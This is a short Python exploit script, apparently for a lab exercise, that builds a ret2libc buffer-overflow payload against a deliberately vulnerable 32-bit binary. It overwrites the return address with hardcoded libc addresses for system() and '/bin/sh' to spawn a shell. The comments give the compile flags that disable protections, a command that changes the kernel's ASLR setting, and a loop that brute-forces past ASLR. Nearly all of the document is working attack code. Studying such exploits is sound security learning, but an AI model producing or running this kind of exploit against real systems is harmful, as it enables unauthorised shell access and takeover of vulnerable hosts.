#!/usr/bin/python
## Buffer overflow pattern generator : https://wiremask.eu/tools/buffer-overflow-pattern-generator/
## compile : gcc -m32 -fno-stack-protector -z execstack buffer.c -o buff
## Basic Ret2libc classic + chain ret2libc
## Uage : ./buff $(cat 2.txt)
## Author : Ramin Farapour Cami
## echo 2 > /proc/sys/kernel/randomize_va_space
## bypass ASLR : ((i=0)); while true; do echo $i; ./buff $(cat 2.txt);((i=i+1));done
import struct
import os
libc_system = struct.pack('<I',0xf7e08540)
libc_binsh = struct.pack('<I',0xf7f444b1)

buffer = "A"*27
buffer += libc_system
buffer += "BBBB"
buffer += libc_binsh
fp = open("2.txt", "w")
fp.write(buffer)
fp.close()
print "Done!"

